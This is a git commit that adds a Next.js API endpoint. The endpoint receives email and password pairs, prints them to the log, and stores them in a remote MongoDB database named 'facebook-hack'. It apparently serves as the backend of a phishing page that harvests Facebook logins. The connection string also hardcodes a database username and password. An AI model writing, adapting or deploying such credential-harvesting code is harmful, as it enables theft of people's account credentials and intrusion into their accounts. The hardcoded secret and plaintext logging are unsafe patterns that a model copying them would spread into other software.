9499395784706f41bef0cf3a95d6e0d9b86e2d09
Sebas-Ar <juan_ariasd@hotmail.com>
2021-06-17 16:25:05 -0500

    first commit

---
+++ pages/api/save-data.js
@@ -0,0 +1,35 @@
+import { MongoClient } from "mongodb";
+
+
+export default function handler(req, res) {
+
+  if (req.method === "POST") {
+
+    const { email, password } = req.body
+
+    // conexion base de datos
+
+    try {
+      const client = new MongoClient('mongodb+srv://sebas:1234@cluster0.z513b.mongodb.net/myFirstDatabase?retryWrites=true&w=majority', {
+        useUnifiedTopology: true,
+        useNewUrlParser: true
+      })
+
+      if (!client.isConnected()) {
+        client.connect().then(() => {
+          client.db('facebook-hack').collection('users').insertOne({ email, password })
+        })
+      }
+    } catch (error) {
+      console.log(error)
+    }
+
+    console.log(email, password)
+
+    res.status(200).json({ message: 'password and email saved' })
+  } else {
+
+    res.status(405).json({ message: 'http message not supported' })
+  }
+
+}
